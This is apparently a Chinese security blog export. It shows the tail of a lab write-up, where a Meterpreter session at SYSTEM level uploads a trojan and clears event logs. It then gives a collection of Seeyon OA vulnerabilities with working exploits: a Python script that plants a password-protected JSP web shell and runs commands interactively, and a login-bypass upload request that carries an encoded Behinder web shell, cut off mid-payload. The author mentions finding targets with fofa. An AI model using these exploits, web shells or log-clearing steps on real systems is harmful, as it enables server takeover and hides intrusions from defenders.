<li><p>输入<code>getuid</code>，查看当前用户ID，发现为<code>Server username: NT AUTHORITY\SYSTEM</code>，拥有最高权限。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565692472731.png" alt="1565692472731"></p>
</li>
<li><p>输入<code>pwd</code>查看当前目录为<code>C:\WINDOWS\system32</code>。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565692507605.png" alt="1565692507605"></p>
</li>
<li><p>输入命令<code>upload /root/trojan.php C:\</code>, 将攻击机上的文件上传至靶机。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565692637821.png" alt="1565692637821"></p>
</li>
<li><p>输入<code>clearev</code>清除日志记录。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565692665054.png" alt="1565692665054"></p>
</li>
</ol>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>​        通过<code>AWVS</code>软件对目标网站进行漏洞扫描，对于<code>Sql注入漏洞</code>、<code>XSS漏洞</code>原理有了更深的理解。通过分析分析扫描数据包，了解了<code>x-scan</code>的漏洞扫描原理。在搭建<code>Snort IDS</code>环境的过程中，由于软件不兼容，出现了一些问题，后期得到解决，在编写检测规则文件过程中，了解了<code>snort</code>的编写规则，在探测过程中，了解了<code>Snort</code>的使用原理，意识到了<code>Snort</code>的强大功能。通过对<code>mysql数据库漏洞</code>进行渗透测试，认识到了<code>Metasploit Framework</code>渗透测试工具的强大，同时意识到了提权漏洞<code>CVE-2012-5613</code>的危害性。</p>
]]></content>
      <categories>
        <category>网络安全实验</category>
      </categories>
      <tags>
        <tag>AWVS</tag>
        <tag>X-Scan</tag>
        <tag>snort IDS</tag>
        <tag>网络扫描</tag>
      </tags>
  </entry>
  <entry>
    <title>致远OA漏洞集合</title>
    <url>/%E8%87%B4%E8%BF%9COA%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88.html</url>
    <content><![CDATA[<h2 id="【CNVD-2019-19299】致远OA-A8远程命令执行漏洞"><a href="#【CNVD-2019-19299】致远OA-A8远程命令执行漏洞" class="headerlink" title="【CNVD-2019-19299】致远OA A8远程命令执行漏洞"></a>【CNVD-2019-19299】致远OA A8远程命令执行漏洞</h2><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>致远A8+协同管理软件存在远程命令执行漏洞。攻击者通过上传精心构造的后门文件即可Getshell，获得目标服务器的权限。</p>
<span id="more"></span>

<h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><ul>
<li>致远A8-V5协同管理软件V6.1sp1</li>
<li>致远A8+协同管理软件V7.0、V7.0sp1、V7.0sp2、V7.0sp3</li>
<li>致远A8+协同管理软件V7.1</li>
</ul>
<h3 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h3><ol>
<li><p>访问<code>/seeyon/htmlofficeservlet</code>如果出现下图所示的内容，表示存在漏洞。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20220912225042.png"></p>
</li>
<li><p>尝试构造POC如下，使用fofa查询很多致远OA，虽然存在<code>/seeyon/htmlofficeservlet</code>，但一直无法写入文件</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"DBSTEP V3.0     355             0               666             DBSTEP=OKMLlKlV"</span></span><br><span class="line">payload += <span class="string">"OPTION=S3WYOSWLBSGr"</span></span><br><span class="line">payload += <span class="string">"currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66"</span></span><br><span class="line">payload += <span class="string">"CREATEDATE=wUghPB3szB3Xwg66"</span></span><br><span class="line">payload += <span class="string">"RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6"</span></span><br><span class="line">payload += <span class="string">"originalFileId=wV66"</span></span><br><span class="line">payload += <span class="string">"originalCreateDate=wUghPB3szB3Xwg66"</span></span><br><span class="line">payload += <span class="string">"FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6"</span></span><br><span class="line">payload += <span class="string">"needReadFile=yRWZdAS6"</span></span><br><span class="line">payload += <span class="string">"originalCreateDate=wLSGP4oEzLKAz4=iz=66"</span></span><br><span class="line">payload += <span class="string">"&lt;%@ page language='java' import='java.util.*,java.io.*'' pageEncoding='UTF-8'%&gt;&lt;%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp+'\n');}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();} %&gt;&lt;%if('asasd3344'.equals(request.getParameter('pwd'))&amp;&amp;!''.equals(request.getParameter('cmd'))){out.println('&lt;pre&gt;'+excuteCmd(request.getParameter('cmd')) + '&lt;/pre&gt;');}else{out.println(':-)');}%&gt;6e4f045d4b8506bf492ada7e3390d7ce"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">post</span>(<span class="params">url</span>):</span><br><span class="line">    url1 = url + <span class="string">"/seeyon/htmlofficeservlet"</span></span><br><span class="line">    header = {<span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:49.0) Gecko/20100101 Firefox/49.0'</span>,</span><br><span class="line">              <span class="string">'Pragma'</span>: <span class="string">'no-cache'</span>, <span class="string">'Content-Length'</span>: <span class="string">'1121'</span>}</span><br><span class="line">    request = requests.post(url1, data=payload, headers=header)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">url,cmd</span>):</span><br><span class="line"></span><br><span class="line">    url2 = url + <span class="string">"/seeyon/test123456.jsp?pwd=asasd3344&amp;cmd=cmd+/c+%s"</span> % cmd</span><br><span class="line"></span><br><span class="line">    request = requests.get(url2)</span><br><span class="line">    response = request.text</span><br><span class="line">    reg = re.<span class="built_in">compile</span>(<span class="string">'&lt;[^&gt;]*&gt;'</span>)</span><br><span class="line">    content = reg.sub(<span class="string">''</span>,response).replace(<span class="string">' '</span>,<span class="string">''</span>)</span><br><span class="line">    <span class="keyword">return</span> content</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">"Usage: python A8-OA-seeyon-RCE.py url"</span></span><br><span class="line">    url = sys.argv[<span class="number">1</span>]</span><br><span class="line">    post(url)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        cmd = raw_input(<span class="string">"Command: "</span>)</span><br><span class="line">        <span class="built_in">print</span></span><br><span class="line">        <span class="built_in">print</span> get(url,cmd)</span><br></pre></td></tr></table></figure>

<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20220912225303.png"></p>
</li>
</ol>
<h2 id="【CNVD-2021-01627】致远OA-ajax-do登录绕过-任意文件上传漏洞"><a href="#【CNVD-2021-01627】致远OA-ajax-do登录绕过-任意文件上传漏洞" class="headerlink" title="【CNVD-2021-01627】致远OA ajax.do登录绕过 任意文件上传漏洞"></a>【CNVD-2021-01627】致远OA ajax.do登录绕过 任意文件上传漏洞</h2><h3 id="漏洞描述-1"><a href="#漏洞描述-1" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>致远OA是一套办公协同管理软件。由于致远OA旧版本某些接口存在未授权访问，以及部分函数存在过滤不足，攻击者通过构造恶意请求，可在无需登录的情况下上传恶意脚本文件，从而控制服务器。致远OA官方已针对该漏洞提供补丁。</p>
<h3 id="影响版本-1"><a href="#影响版本-1" class="headerlink" title="影响版本"></a>影响版本</h3><p>致远OA V8.0</p>
<p>致远OA V7.1、V7.1SP1</p>
<p>致远OA V7.0、V7.0SP1、V7.0SP2、V7.0SP3</p>
<p>致远OA V6.0、V6.1SP1、V6.1SP2</p>
<p>致远OA V5.x</p>
<p>致远OA G6</p>
<h3 id="复现过程-1"><a href="#复现过程-1" class="headerlink" title="复现过程"></a>复现过程</h3><ol>
<li><p>访问URL<code>/seeyon/thirdpartyController.do.css/..;/ajax.do</code>，出现如下异常则可能存在漏洞</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20220912225355.png"></p>
</li>
<li><p>然后调用未授权的文件上传接口上传webshell文件，构造POST请求，上传冰蝎马</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/seeyon/autoinstall.do.css/..;/ajax.do?method=ajaxAction&amp;managerName=formulaManager&amp;requestCompress=gzip</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>xxx.xxx.xxx.xxx</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:101.0) Gecko/20100101 Firefox/101.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>3521</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://xxx.xxx.xxx.xxx</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://xxx.xxx.xxx.xxx/seeyon/thirdpartyController.do.css/..;/ajax.do</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>JSESSIONID=a2e1cfbb-ae00-422b-8624-383d33226aff; loginPageURL=""</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"></span><br><span class="line"><span class="language-llvm">managerMethod<span class="operator">=</span>validate&amp;arguments<span class="operator">=</span><span class="variable">%1</span>F<span class="variable">%C2</span><span class="variable">%8</span>B<span class="variable">%08</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span>uTK<span class="variable">%C2</span><span class="variable">%93</span><span class="variable">%C2</span><span class="variable">%A2H</span><span class="variable">%10</span><span class="variable">%3</span>E<span class="variable">%C3</span><span class="variable">%AF</span><span class="variable">%C3</span><span class="variable">%BE</span><span class="variable">%0</span>A<span class="variable">%C3</span><span class="variable">%82</span><span class="variable">%C2</span><span class="variable">%8</span>Bv<span class="variable">%C3</span><span class="variable">%B4</span><span class="variable">%C2</span><span class="variable">%8</span>C<span class="variable">%C2</span><span class="variable">%8</span>D+<span class="keyword">c</span><span class="variable">%C2</span><span class="variable">%BB</span><span class="variable">%13</span><span class="variable">%7</span>Bh_<span class="variable">%C2</span><span class="variable">%88</span><span class="variable">%28</span>*<span class="variable">%28</span><span class="variable">%C2</span><span class="variable">%AF</span><span class="variable">%C2</span><span class="variable">%8</span>D<span class="variable">%3</span>D<span class="variable">%40</span><span class="variable">%15</span>Ba<span class="variable">%15</span><span class="variable">%C2</span><span class="variable">%B0</span><span class="variable">%C3</span><span class="variable">%B2</span><span class="variable">%10</span><span class="variable">%C3</span><span class="variable">%AC</span><span class="variable">%C2</span><span class="variable">%98</span><span class="variable">%C3</span><span class="variable">%BF</span><span class="variable">%C2</span><span class="variable">%BE</span><span class="variable">%05</span><span class="variable">%C3</span><span class="variable">%98</span><span class="variable">%C3</span><span class="variable">%93</span><span class="variable">%3</span>D<span class="variable">%C2</span><span class="variable">%B1</span><span class="variable">%C2</span><span class="variable">%BDu</span><span class="variable">%C2</span><span class="variable">%A9</span><span class="variable">%C3</span><span class="variable">%8</span>C<span class="variable">%C2</span><span class="variable">%AC</span><span class="variable">%C3</span><span class="variable">%8</span>C<span class="variable">%C2</span><span class="variable">%AF</span><span class="variable">%C3</span><span class="variable">%B2</span><span class="variable">%C3</span><span class="variable">%BD</span><span class="variable">%C3</span><span class="variable">%97</span>k<span class="variable">%C3</span><span class="variable">%B7</span><span class="variable">%14</span>_H<span class="variable">%C2</span><span class="variable">%8</span>E<span class="variable">%C2</span><span class="variable">%9</span>DC<span class="variable">%C2</span><span class="variable">%95</span><span class="keyword">x</span><span class="variable">%C3</span><span class="variable">%9</span>D<span class="variable">%3</span>F<span class="variable">%C2</span><span class="variable">%98</span><span class="variable">%C3</span><span class="variable">%81</span><span class="variable">%17</span><span class="variable">%C3</span><span class="variable">%A6M</span><span class="variable">%C2</span><span class="variable">%A28</span><span class="variable">%C2</span><span class="variable">%A4</span><span class="variable">%C2</span><span class="variable">%96</span>t<span class="number">3</span><span class="variable">%2</span>F<span class="variable">%C3</span><span class="variable">%8</span>D<span class="variable">%C2</span><span class="variable">%BA</span><span class="variable">%C3</span><span class="variable">%AF</span><span class="variable">%C3</span><span class="variable">%A2y</span><span class="variable">%C2</span><span class="variable">%99</span><span class="variable">%5</span>C<span class="variable">%C2</span><span class="variable">%BC4EqT</span><span class="variable">%3</span>Fj<span class="variable">%C3</span><span class="variable">%99</span><span class="variable">%05</span>E<span class="variable">%3</span>E<span class="variable">%C2</span><span class="variable">%938</span>Y<span class="variable">%C3</span><span class="variable">%80</span><span class="variable">%C3</span><span class="variable">%BC</span><span class="variable">%C3</span><span class="variable">%89</span>t<span class="variable">%C3</span><span class="variable">%BA</span><span class="variable">%C3</span><span class="variable">%BD</span><span class="variable">%C2</span><span class="variable">%A7</span><span class="variable">%C2</span><span class="variable">%AB</span><span class="variable">%C3</span><span class="variable">%A7</span><span class="variable">%3</span>AI<span class="variable">%C2</span><span class="variable">%92</span><span class="variable">%3</span>E<span class="variable">%C2</span><span class="variable">%A5</span><span class="variable">%C2</span><span class="variable">%9</span>EW<span class="variable">%C3</span><span class="variable">%85</span><span class="variable">%C3</span><span class="variable">%91</span>S<span class="variable">%C3</span><span class="variable">%A7</span><span class="variable">%C3</span><span class="variable">%BB</span><span class="variable">%C3</span><span class="variable">%AFL</span><span class="variable">%7</span>B<span class="variable">%7</span>E<span class="variable">%0</span>B<span class="variable">%C2</span><span class="variable">%9</span>D<span class="variable">%C3</span><span class="variable">%82</span><span class="variable">%C3</span><span class="variable">%A9</span><span class="variable">%C2</span><span class="variable">%A3</span><span class="variable">%C2</span><span class="variable">%B8</span><span class="variable">%C2</span><span class="variable">%BF</span><span class="variable">%C2</span><span class="variable">%A3</span><span class="variable">%26</span><span class="variable">%C2</span><span class="variable">%99</span>qA<span class="variable">%C2</span><span class="variable">%99</span>wa<span class="variable">%C2</span><span class="variable">%92</span>w<span class="variable">%C2</span><span class="variable">%9</span>A<span class="variable">%C2</span><span class="variable">%A3</span><span class="variable">%00</span><span class="variable">%C2</span><span class="variable">%91</span>we<span class="variable">%3</span>EQ<span class="variable">%C3</span><span class="variable">%AB</span><span class="variable">%C3</span><span class="variable">%95</span><span class="variable">%C3</span><span class="variable">%B8</span><span class="variable">%C2</span><span class="variable">%8</span>F<span class="variable">%1</span>D<span class="variable">%C2</span><span class="variable">%AD</span><span class="variable">%C2</span><span class="variable">%81</span><span class="variable">%3</span>C<span class="variable">%26</span><span class="variable">%C3</span><span class="variable">%90</span><span class="variable">%C3</span><span class="variable">%89</span><span class="variable">%C2</span><span class="variable">%BCA</span><span class="variable">%3</span>FL<span class="variable">%C2</span><span class="variable">%93</span><span class="variable">%C2</span><span class="variable">%B2</span><span class="variable">%C3</span><span class="variable">%B3</span><span class="variable">%C3</span><span class="variable">%B0</span><span class="variable">%13</span><span class="variable">%C2</span><span class="variable">%9</span>E<span class="variable">%C2</span><span class="variable">%B9</span><span class="variable">%C2</span><span class="variable">%BB</span><span class="variable">%C2</span><span class="variable">%92</span><span class="variable">%06</span><span class="variable">%1</span>E<span class="variable">%C3</span><span class="variable">%86</span><span class="variable">%C2</span><span class="variable">%B5</span><span class="variable">%2</span>F<span class="variable">%3</span>B<span class="number">1</span><span class="variable">%C2</span><span class="variable">%B9</span><span class="variable">%C2</span><span class="variable">%81</span>YR<span class="variable">%C2</span><span class="variable">%B9</span><span class="variable">%C3</span><span class="variable">%9</span>C<span class="variable">%C2</span><span class="variable">%98</span><span class="variable">%C2</span><span class="variable">%95</span><span class="variable">%C2</span><span class="variable">%96</span>A<span class="variable">%C3</span><span class="variable">%A6</span><span class="variable">%C2</span><span class="variable">%8</span>A<span class="variable">%C3</span><span class="variable">%82</span>mKj<span class="variable">%19</span><span class="variable">%C2</span><span class="variable">%8</span>B<span class="variable">%C2</span><span class="variable">%9</span>C<span class="variable">%C2</span><span class="variable">%A5</span><span class="variable">%C3</span><span class="variable">%8</span>A<span class="variable">%C2</span><span class="variable">%82</span>Y<span class="variable">%5</span>C<span class="variable">%C2</span><span class="variable">%AC</span><span class="variable">%C2</span><span class="variable">%B9</span><span class="variable">%24</span><span class="variable">%C2</span><span class="variable">%80</span>d<span class="variable">%C2</span><span class="variable">%9</span>E<span class="variable">%03</span><span class="variable">%5</span>E<span class="variable">%C3</span><span class="variable">%8</span>F<span class="variable">%C3</span><span class="variable">%97</span>D<span class="variable">%29</span><span class="variable">%5</span>Cm<span class="variable">%2</span>C<span class="variable">%1</span>F<span class="variable">%07</span><span class="variable">%2</span>F<span class="variable">%C3</span><span class="variable">%85</span>Q<span class="variable">%5</span>CD<span class="variable">%C2</span><span class="variable">%B6</span><span class="variable">%26</span><span class="variable">%C3</span><span class="variable">%B9</span><span class="variable">%C2</span><span class="variable">%90</span><span class="variable">%C3</span><span class="variable">%A8</span><span class="variable">%15</span><span class="variable">%C3</span><span class="variable">%A0p</span><span class="variable">%C3</span><span class="variable">%A1</span><span class="variable">%C2</span><span class="variable">%86</span><span class="variable">%2</span>C<span class="variable">%C3</span><span class="variable">%9</span>Ah<span class="variable">%C3</span><span class="variable">%83</span>J<span class="variable">%0</span>A<span class="variable">%C2</span><span class="variable">%87</span><span class="variable">%C3</span><span class="variable">%8</span>FN<span class="variable">%C2</span><span class="variable">%A4</span><span class="variable">%5</span>C<span class="variable">%C2</span><span class="variable">%B7DM</span><span class="variable">%00</span><span class="variable">%C3</span><span class="variable">%91</span>C<span class="variable">%28</span>b<span class="variable">%C3</span><span class="variable">%8</span>E<span class="variable">%C3</span><span class="variable">%96</span><span class="variable">%C2</span><span class="variable">%84</span><span class="variable">%C2</span><span class="variable">%ABe</span><span class="variable">%40</span><span class="variable">%2</span>C<span class="variable">%C2</span><span class="variable">%898</span><span class="variable">%03</span><span class="variable">%C3</span><span class="variable">%A2</span><span class="variable">%C2</span><span class="variable">%B8</span><span class="variable">%C2</span><span class="variable">%825</span><span class="variable">%3</span>EYp<span class="variable">%C2</span><span class="variable">%96</span><span class="variable">%26</span><span class="variable">%0</span>C<span class="variable">%C3</span><span class="variable">%A8</span><span class="variable">%7</span>B<span class="variable">%C2</span><span class="variable">%BAFq</span><span class="variable">%C3</span><span class="variable">%9</span>A<span class="variable">%C3</span><span class="variable">%B0</span><span class="variable">%C2</span><span class="variable">%A6</span><span class="variable">%C2</span><span class="variable">%9</span>F<span class="variable">%5</span>B<span class="variable">%C3</span><span class="variable">%BCJ</span><span class="variable">%00</span>K<span class="variable">%C2</span><span class="variable">%B5</span><span class="variable">%C3</span><span class="variable">%B8TFqmc</span><span class="variable">%C2</span><span class="variable">%93</span><span class="variable">%C3</span><span class="variable">%8</span>BH*va<span class="variable">%C3</span><span class="variable">%B9</span><span class="variable">%0</span>F<span class="variable">%C3</span><span class="variable">%A0_</span><span class="variable">%C2</span><span class="variable">%BE</span><span class="variable">%C3</span><span class="variable">%99</span><span class="variable">%C2</span><span class="variable">%A2</span><span class="variable">%1</span>E<span class="variable">%C2</span><span class="variable">%BA</span><span class="variable">%C3</span><span class="variable">%A2</span><span class="variable">%C2</span><span class="variable">%A2</span><span class="variable">%C2</span><span class="variable">%B2L5q</span><span class="variable">%C2</span><span class="variable">%B9</span><span class="variable">%C3</span><span class="variable">%A1</span><span class="variable">%C2</span><span class="variable">%A3</span><span class="variable">%24</span>*<span class="variable">%C2</span><span class="variable">%A9e</span>*<span class="number">7</span>iq<span class="variable">%C3</span><span class="variable">%B4m3</span><span class="variable">%60</span>mC<span class="number">8</span><span class="variable">%C2</span><span class="variable">%83</span>j<span class="number">2</span><span class="variable">%C2</span><span class="variable">%A3</span><span class="variable">%3</span>A<span class="number">7</span><span class="variable">%C3</span><span class="variable">%80</span><span class="variable">%C2</span><span class="variable">%96</span><span class="variable">%C2</span><span class="variable">%85</span>e<span class="variable">%C2</span><span class="variable">%A8</span><span class="variable">%18</span>D<span class="variable">%C2</span><span class="variable">%99</span>.<span class="variable">%C3</span><span class="variable">%8</span>F<span class="variable">%5</span>B<span class="variable">%C2</span><span class="variable">%BD</span><span class="variable">%C2</span><span class="variable">%838</span><span class="variable">%0</span>E<span class="variable">%28</span>F<span class="variable">%25</span><span class="variable">%C2</span><span class="variable">%89</span><span class="variable">%C2</span><span class="variable">%9</span>B<span class="variable">%C3</span><span class="variable">%84</span><span class="variable">%C3</span><span class="variable">%A3</span><span class="variable">%C2</span><span class="variable">%95</span><span class="variable">%01</span><span class="variable">%C2</span><span class="variable">%A0</span><span class="variable">%C2</span><span class="variable">%B4L</span><span class="variable">%C3</span><span class="variable">%A9-</span><span class="variable">%3</span>F<span class="variable">%C2</span><span class="variable">%B8Bc</span><span class="variable">%C2</span><span class="variable">%95</span><span class="variable">%3</span>A<span class="variable">%C3</span><span class="variable">%86</span><span class="variable">%C3</span><span class="variable">%86</span><span class="variable">%C3</span><span class="variable">%9</span>Fse<span class="variable">%00</span><span class="variable">%C3</span><span class="variable">%B8</span><span class="variable">%C2</span><span class="variable">%8</span>DoW<span class="variable">%01</span><span class="variable">%C3</span><span class="variable">%B2L</span><span class="variable">%15</span>K<span class="variable">%C2</span><span class="variable">%8</span>B<span class="variable">%0</span>CZ<span class="variable">%08</span><span class="variable">%C2</span><span class="variable">%8</span>Fh<span class="variable">%7</span>C<span class="variable">%2</span>C<span class="number">4</span>W<span class="variable">%C2</span><span class="variable">%B9</span><span class="variable">%C2</span><span class="variable">%B4l</span><span class="variable">%C3</span><span class="variable">%AD</span><span class="variable">%C3</span><span class="variable">%96</span>D<span class="variable">%C3</span><span class="variable">%856</span><span class="variable">%C3</span><span class="variable">%81</span><span class="variable">%C2</span><span class="variable">%B9</span><span class="variable">%7</span>Dl<span class="variable">%C2</span><span class="variable">%B1eQJ7</span><span class="variable">%C3</span><span class="variable">%93</span><span class="variable">%12</span><span class="variable">%C2</span><span class="variable">%ADI</span><span class="variable">%C2</span><span class="variable">%89</span><span class="variable">%5</span>D<span class="variable">%02</span>Ygz<span class="variable">%1</span>E<span class="variable">%C2</span><span class="variable">%9</span>DL<span class="variable">%C3</span><span class="variable">%B6</span><span class="variable">%C2</span><span class="variable">%99</span><span class="variable">%C3</span><span class="variable">%A6</span><span class="variable">%C2</span><span class="variable">%B4</span><span class="variable">%C3</span><span class="variable">%8</span>E<span class="variable">%C3</span><span class="variable">%BB</span><span class="variable">%C3</span><span class="variable">%996</span>j<span class="variable">%C2</span><span class="variable">%BDU</span><span class="variable">%40</span>s<span class="variable">%40</span><span class="variable">%C3</span><span class="variable">%B3w</span><span class="variable">%C3</span><span class="variable">%8</span>F<span class="variable">%5</span>B<span class="variable">%C2</span><span class="variable">%A4</span><span class="variable">%C2</span><span class="variable">%84</span><span class="variable">%C2</span><span class="variable">%80</span><span class="variable">%C3</span><span class="variable">%A0</span><span class="variable">%2</span>B<span class="variable">%14</span>K<span class="variable">%0</span>Cg<span class="variable">%C3</span><span class="variable">%82</span><span class="variable">%01</span>.W<span class="variable">%C2</span><span class="variable">%89</span>K<span class="variable">%C2</span><span class="variable">%80</span><span class="variable">%C3</span><span class="variable">%AF</span><span class="variable">%C3</span><span class="variable">%9</span>CXd<span class="variable">%1</span>F<span class="variable">%C3</span><span class="variable">%B6</span><span class="variable">%03</span><span class="variable">%C3</span><span class="variable">%BB</span><span class="variable">%C2</span><span class="variable">%B0</span><span class="variable">%C2</span><span class="variable">%A9</span><span class="variable">%C2</span><span class="variable">%B6</span><span class="variable">%C2</span><span class="variable">%86</span><span class="variable">%C2</span><span class="variable">%8</span>D<span class="variable">%C2</span><span class="variable">%ADP</span><span class="variable">%3</span>Fo<span class="variable">%0</span>F<span class="variable">%C3</span><span class="variable">%92</span><span class="variable">%C3</span><span class="variable">%80</span>B<span class="variable">%C3</span><span class="variable">%92</span><span class="variable">%08</span>p<span class="variable">%C3</span><span class="variable">%BA</span><span class="variable">%C2</span><span class="variable">%AD</span><span class="variable">%C2</span><span class="variable">%A9</span><span class="variable">%01</span><span class="variable">%12</span><span class="variable">%C2</span><span class="variable">%AE</span><span class="variable">%C3</span><span class="variable">%90</span>T<span class="variable">%0</span>D<span class="variable">%C3</span><span class="variable">%8</span>B<span class="variable">%28</span><span class="variable">%07</span><span class="variable">%C2</span><span class="variable">%B6</span><span class="variable">%C3</span><span class="variable">%A6</span><span class="variable">%23</span><span class="variable">%C2</span><span class="variable">%A8I</span><span class="variable">%C2</span><span class="variable">%A9S</span><span class="variable">%C2</span><span class="variable">%9</span>DG<span class="variable">%7</span>B<span class="variable">%0</span>E_<span class="variable">%C2</span><span class="variable">%9</span>D<span class="number">6</span><span class="variable">%C3</span><span class="variable">%86</span><span class="variable">%C3</span><span class="variable">%B1</span><span class="variable">%1</span>B<span class="variable">%C2</span><span class="variable">%BD</span><span class="variable">%26</span><span class="variable">%10</span><span class="variable">%C3</span><span class="variable">%839</span><span class="variable">%C2</span><span class="variable">%A6uU</span><span class="variable">%03</span><span class="variable">%C2</span><span class="variable">%97</span><span class="variable">%28</span>X<span class="variable">%C2</span><span class="variable">%9</span>E<span class="variable">%C2</span><span class="variable">%AE</span><span class="variable">%26</span><span class="variable">%C2</span><span class="variable">%AA</span><span class="variable">%C2</span><span class="variable">%BEA</span><span class="variable">%C3</span><span class="variable">%B2</span><span class="variable">%21</span><span class="variable">%0</span>B<span class="variable">%C3</span><span class="variable">%974</span><span class="variable">%06</span><span class="variable">%C3</span><span class="variable">%87</span><span class="variable">%C3</span><span class="variable">%9</span>C<span class="variable">%C3</span><span class="variable">%87</span><span class="variable">%1</span>BT<span class="variable">%C3</span><span class="variable">%A6</span><span class="variable">%C2</span><span class="variable">%B6</span><span class="variable">%09</span><span class="variable">%C3</span><span class="variable">%BC</span><span class="variable">%23</span><span class="variable">%C2</span><span class="variable">%A7</span><span class="variable">%C2</span><span class="variable">%87</span>u<span class="variable">%C2</span><span class="variable">%AC</span><span class="variable">%1</span>A<span class="variable">%C2</span><span class="variable">%A7</span><span class="variable">%0</span>BG<span class="variable">%7</span>E<span class="variable">%C2</span><span class="variable">%82</span><span class="variable">%C2</span><span class="variable">%AD</span><span class="variable">%C3</span><span class="variable">%8</span>A<span class="variable">%C2</span><span class="variable">%8</span>F<span class="variable">%3</span>F<span class="variable">%C3</span><span class="variable">%BC</span><span class="variable">%19</span><span class="variable">%C3</span><span class="variable">%99</span><span class="variable">%C2</span><span class="variable">%BF</span><span class="variable">%C3</span><span class="variable">%BE</span><span class="variable">%C2</span><span class="variable">%99</span><span class="variable">%C3</span><span class="variable">%88</span><span class="variable">%C2</span><span class="variable">%95</span><span class="variable">%C2</span><span class="variable">%84</span>d<span class="variable">%C2</span><span class="variable">%AD</span><span class="variable">%C2</span><span class="variable">%91</span>O<span class="variable">%C3</span><span class="variable">%AB</span><span class="variable">%7</span>C<span class="variable">%C2</span><span class="variable">%81</span><span class="variable">%C3</span><span class="variable">%8</span>AO<span class="variable">%C3</span><span class="variable">%96</span>o<span class="variable">%C3</span><span class="variable">%B8</span><span class="variable">%C3</span><span class="variable">%9</span>Ay<span class="variable">%C3</span><span class="variable">%A4</span><span class="variable">%12</span><span class="variable">%C2</span><span class="variable">%9</span>D<span class="variable">%C2</span><span class="variable">%A7</span><span class="variable">%C3</span><span class="variable">%B5</span><span class="variable">%C2</span><span class="variable">%89</span><span class="variable">%C2</span><span class="variable">%A1</span><span class="variable">%18</span><span class="variable">%24</span><span class="variable">%C2</span><span class="variable">%A0j</span><span class="variable">%C3</span><span class="variable">%B4</span><span class="variable">%C3</span><span class="variable">%9</span>A<span class="variable">%C3</span><span class="variable">%BA</span><span class="variable">%C3</span><span class="variable">%94</span>z<span class="variable">%C2</span><span class="variable">%8</span>D_<span class="variable">%C2</span><span class="variable">%BF</span><span class="variable">%C3</span><span class="variable">%96</span>F<span class="variable">%C2</span><span class="variable">%9</span>E<span class="variable">%C2</span><span class="variable">%9</span>E<span class="variable">%C2</span><span class="variable">%A9</span><span class="variable">%1</span>C<span class="variable">%C3</span><span class="variable">%84</span>V<span class="variable">%25</span><span class="variable">%C2</span><span class="variable">%9</span>C<span class="variable">%5</span>D<span class="variable">%C3</span><span class="variable">%96</span><span class="variable">%C2</span><span class="variable">%A6</span><span class="variable">%C3</span><span 